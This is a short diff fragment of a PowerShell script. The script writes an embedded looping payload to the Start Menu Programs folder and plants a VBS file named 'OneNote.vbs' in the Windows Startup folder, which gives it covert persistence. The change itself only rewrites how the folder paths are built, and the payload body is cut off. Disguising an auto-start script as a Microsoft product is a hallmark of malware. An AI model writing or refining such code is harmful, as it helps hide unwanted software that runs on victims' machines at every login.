@@ -51,17 +51,17 @@ while ($true) {
 '@
 
 
-$programsFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs')
+$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)
 
 
-$scriptPath = [System.IO.Path]::Combine($programsFolder, 'script.ps1')
+$scriptPath = Join-Path $programsFolder "script.ps1"
 $code | Out-File -FilePath $scriptPath -Encoding ascii
 
 
-$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Startup)
 
 
-$batchScriptPath = [System.IO.Path]::Combine($startupFolder, 'OneNote.vbs')
+$batchScriptPath = Join-Path $startupFolder "OneNote.vbs"
 $batchCode = @"
 Function IsProcessRunning(processName)
     Dim objWMIService, colProcesses, objProcess
